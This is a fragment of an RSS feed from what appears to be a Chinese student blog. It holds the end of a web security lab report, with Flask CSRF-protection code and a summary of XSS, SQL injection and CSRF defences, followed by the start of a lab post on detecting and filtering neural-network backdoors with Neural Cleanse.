class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义评论表单类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;CommentForm&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;FlaskForm&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    newComment = StringField(&lt;span class=&#34;string&#34;&gt;&amp;#x27;评论&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    submit = SubmitField(&lt;span class=&#34;string&#34;&gt;&amp;#x27;提交新评论&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dataset = [&lt;span class=&#34;string&#34;&gt;&amp;quot;BIT网络安全课程真有趣&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Web安全演示实验打卡&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;祝同学们都能取得好成绩!&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    form = CommentForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; form.validate_on_submit():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        comment = form.newComment.data.strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; comment:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            dataset.append(comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    query = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_dataset = [x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; dataset &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; query.lower() &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.lower()]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;, form=form, comments=sub_dataset, query=query)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run(debug=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改 index.html 代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;lang&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Web安全实验&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Web安全实验&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;查询评论&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;get&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        搜索内容：&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;placeholder&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;搜索内容&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;提交&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% if query %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;查询评论 &amp;quot;&amp;#123;&amp;#123; query &amp;#125;&amp;#125;&amp;quot; 结果如下：&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% else %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;所有的评论如下：&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% for comment in comments %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;#123;&amp;#123; comment &amp;#125;&amp;#125;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;发布评论&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&amp;#123; form.hidden_tag() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&amp;#123; form.newComment.label &amp;#125;&amp;#125;: &amp;#123;&amp;#123; form.newComment(size=20) &amp;#125;&amp;#125;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&amp;#123; form.submit() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/jMSQfyTWsonIBNC.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们此时运行 app.py 后再点击 CSRF_attack.py，显示攻击失败&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论与体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论与体会&#34;&gt;#&lt;/a&gt; 结论与体会&lt;/h2&gt;
&lt;p&gt;​	通过本次实验，我深入理解了 Web 安全中几种常见攻击方式：XSS 和 CSRF，以及 SQL 注入的概念和防御策略。通过实际操作实验，我不仅加深了对这些概念的认识，也学会了如何在实际开发中应用相关防御技术。&lt;/p&gt;
&lt;p&gt;​	XSS 攻击及防御：通过构造特殊的 URL 或输入恶意脚本代码到评论中，我成功模拟了反射型和持久型 XSS 攻击。这一过程让我认识到了用户输入验证和转义的重要性。通过使用 escape 函数转义用户输入，我学会了一种有效防御 XSS 攻击的方法。这个方法能够防止恶意脚本执行，保护网站和用户免受攻击。&lt;/p&gt;
&lt;p&gt;​	SQL 注入及防御：我通过在登录框中输入特殊的 SQL 语句成功实现了 SQL 注入攻击，绕过了登录验证。攻击成功后，通过修改代码，采用参数化查询的方式，我学会了如何防御 SQL 注入攻击。这种方法通过将输入作为参数传递给 SQL 语句，有效避免了恶意输入被解释执行的风险。&lt;/p&gt;
&lt;p&gt;​	CSRF 攻击及防御：我尝试通过构造恶意网页自动提交表单的方式发起 CSRF 攻击，但最终通过引入 Flask-WTF 提供的 CSRF 保护机制成功防御了这种攻击。通过实验，我了解到 CSRF 令牌的作用及其在 Web 应用安全中的重要性。&lt;/p&gt;
&lt;p&gt;​	安全意识的重要性：作为一名 Web 开发者，必须具备安全意识，了解常见的 Web 攻击方式和防御策略，这对于开发安全的 Web 应用至关重要。&lt;/p&gt;
&lt;p&gt;​	持续学习和实践：随着 Web 技术的发展，新的安全威胁不断出现。只有不断学习和实践，才能有效地应对这些安全挑战。&lt;/p&gt;
&lt;p&gt;​	工具和库的作用：Flask-WTF 等工具和库提供了方便的防御机制，如 CSRF 保护、用户输入的转义等，能够大大提高开发效率和应用安全性。合理利用这些工具和库，可以让我们更加专注于业务逻辑的开发。&lt;/p&gt;
&lt;p&gt;​	安全策略的综合运用：在实际开发中，应综合运用各种安全策略，如输入验证、参数化查询、使用 HTTPS、设置合理的 HTTP 安全头等，来构建一个多层次的安全防御体系。&lt;/p&gt;
&lt;p&gt;​	通过本次实验，我不仅掌握了一些具体的防御技术，也对 Web 安全的重要性有了更深刻的认识。在未来的学习和工作中，我将继续关注 Web 安全领域的最新动态，不断提高自己的安全防御能力。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%E5%AE%89%E5%85%A8_%E5%90%8E%E9%97%A8%E9%98%B2%E5%BE%A1_%E9%80%89%E5%81%9A/</guid>
            <title>人工智能算法安全_后门防御_选座</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%E5%AE%89%E5%85%A8_%E5%90%8E%E9%97%A8%E9%98%B2%E5%BE%A1_%E9%80%89%E5%81%9A/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 15:03:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;人工智能算法安全_后门防御_选做&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#人工智能算法安全_后门防御_选做&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLUN5YmVyc2VjdXJpdHktLS1BSS1BbGdvcml0aG1pYy1TZWN1cml0eV9CYWNrZG9vci1EZWZlbnNlX09wdGlvbmFs&#34;&gt;人工智能算法安全_后门防御_选做&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验介绍&#34;&gt;#&lt;/a&gt; 实验介绍&lt;/h2&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;p&gt;面向后门攻击的防御，指的是利用数据的独特属性或者精心设计的防御机制，来降低后门攻击的成功率。为了防御后门攻击，本实验可以主动地识别输入数据中是否包含用于后门攻击的触发器（也就是特定模式的噪音），或者通过数据的其他特性来削弱甚至抵消后门攻击的性能&lt;/p&gt;
&lt;h3 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h3&gt;
&lt;p&gt;在已实现后门攻击的基础之上，参考所给论文，实现后门攻击的防御&lt;/p&gt;
&lt;h3 id=&#34;参考论文&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考论文&#34;&gt;#&lt;/a&gt; 参考论文&lt;/h3&gt;
&lt;p&gt;Neural Cleanse: Identifying and Mitigating Backdoor Attacks in Neural Networks&lt;/p&gt;
&lt;h3 id=&#34;参考代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考代码&#34;&gt;#&lt;/a&gt; 参考代码&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JvbHVud2FuZy9iYWNrZG9vcg==&#34;&gt;backdoor&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;实验思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验思路&#34;&gt;#&lt;/a&gt; 实验思路&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/aBpGmKLuF3gd2ri.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;训练一个能将后门数据识别为单一指定标签的后门攻击模型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在步骤 1 模型上，针对每个类别生成一个反向触发器，根据各触发器 L1 范数大小，基于 MAD 技术，判断该模型确被后门所污染&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获得后门模型的反向触发器后，从下列三种方法中任选一种，实现后门攻击的防御&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;识别过滤后门输入&lt;/strong&gt;：建立神经元激活过滤器。激活值定义为第二层到最后一层中激活值排名前 1% 的神经元的平均激活值。过滤器将后门输入识别为那些激活值高于一定阈值的输入，模型将不对这些输入进行预测&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;后门削弱 —— 剪枝&lt;/strong&gt;：关注神经网络各个中间层神经元的激活值，并修剪一定比例的神经元（优先考虑修改在干净输入和后门输入之间激活差距最大的神经元）。即在推理过程中将这些神经元的输出值设置为 0，当修剪后的模型不再响应反向触发时，停止剪枝&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;后门削弱 ——Unlearning&lt;/strong&gt;：对后门模型进行重新训练，使得模型遗忘原来的后门。使用步骤 2 中获得的反向触发器，将其与正常训练数据结合，且数据对应原本的标签。利用构造的新训练集对模型再次进行训练，使得受到后门攻击的模型可以识别后门输入的正确标签&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;实验预期&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验预期&#34;&gt;#&lt;/a&gt; 实验预期&lt;/h3&gt;
&lt;p&gt;​	在防御之后，模型被攻击成功的概率将会明显下降，但是模型对良性样本预测的准确率也会略有下降&lt;/p&gt;
&lt;h3 id=&#34;实验方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验方法&#34;&gt;#&lt;/a&gt; 实验方法&lt;/h3&gt;
&lt;p&gt;​	本实验采用识别&lt;strong&gt;过滤后门输入&lt;/strong&gt;来进行后门攻击的防御&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备&#34;&gt;#&lt;/a&gt; 实验准备&lt;/h2&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;磁盘驱动器：NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;KIOXIA-&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EXCERIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G2&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;SSD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Micron&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3400 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;MTFDKBA1TOTFH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;显示器：NVIDIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GeForce&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;RTX&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3070 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;Ti&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Laptop&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GPU&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统型号&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;ROG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Strix&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW_G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统类型&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;基于&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;的电脑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;处理器&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;12th&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Gen&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Intel(R)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Core(TM)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;i9-12900H，2500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Mhz，14&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个内核，20&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个逻辑处理器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 